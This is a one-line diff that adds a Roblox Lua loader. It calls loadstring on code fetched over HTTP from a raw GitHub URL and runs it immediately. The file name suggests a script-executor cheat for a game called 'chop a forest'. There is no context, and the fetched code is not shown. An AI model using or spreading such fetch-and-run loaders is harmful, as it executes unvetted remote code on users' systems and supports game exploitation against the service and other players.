@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/chop-a-forest-spam2-uauq7bvlo8v63l.lua"))()
